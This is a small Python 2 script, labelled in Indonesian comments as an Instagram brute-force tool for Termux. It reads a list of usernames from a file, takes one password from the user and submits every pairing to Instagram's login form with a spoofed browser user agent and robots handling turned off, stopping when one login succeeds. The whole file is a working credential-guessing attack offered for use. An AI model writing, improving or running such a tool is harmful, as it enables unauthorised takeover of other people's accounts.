#!/bin/bash

# Pakai Di Termux 
# Code By Riskis7
# IG Brute Force v.2.1
# 7/9/2018
"""
Instragram : @Riskis77
"""

import mechanize
import platform,os

br = mechanize.Browser()

f = open('username.txt')

def options():
    br.set_handle_robots(False)
    br.set_handle_refresh(False)
    br.set_handle_gzip(False)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_redirect(True)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Iceweasel/31.5.0')]
    mulai()

def keluar():
        print "[!] Keluar ..."
        f.close()
        os.sys.exit()

def mulai():
    try:
        username = f.readline()
        print ""
        password = raw_input("Password : ")
        while username:
            print ("[+] Mencoba Username : "+username)
            br.open("https://www.instagram.com/accounts/login/?force_classic_login")
            br.select_form(nr=0)
            br.form[ 'username' ] = username.strip()
            br.form[ 'password' ] = password
            br.submit()
            log = br.geturl()
            print log
            if log == "https://www.instagram.com/":
                print "[+] Berhasil Login ..."
                keluar()
            else:
                os.system("clear")
            username = f.readline()
    except:
        f.close()

def menu():
        print "____           ___     __   _           __      _________ "
        print "|| \\    <>   // \\    ||  //    <>    //\\    |_______//  ============================"
        print "|| ||    ||  //   \\   || //     ||   //  \\          //   https://github.com/Riskis7"
        print "||<//    ||  \\  __    ||//\\    ||   \\  __         //    Wa : ************"
        print "|| \\    ||   \\//\\   ||   \\   ||    \\//\\       //     IG : Riskiss7"
        print "||__\\___||_______//___||____\\__||________//______//       ============================"
        print ""
        print "[1] Mulai"
        print "[2] Keluar"
        print " "
        pilih = input("Pilih [1/2] : ")
        if pilih == 1:
                options()
        else:
                keluar()

if __name__ == "__main__":
        menu()


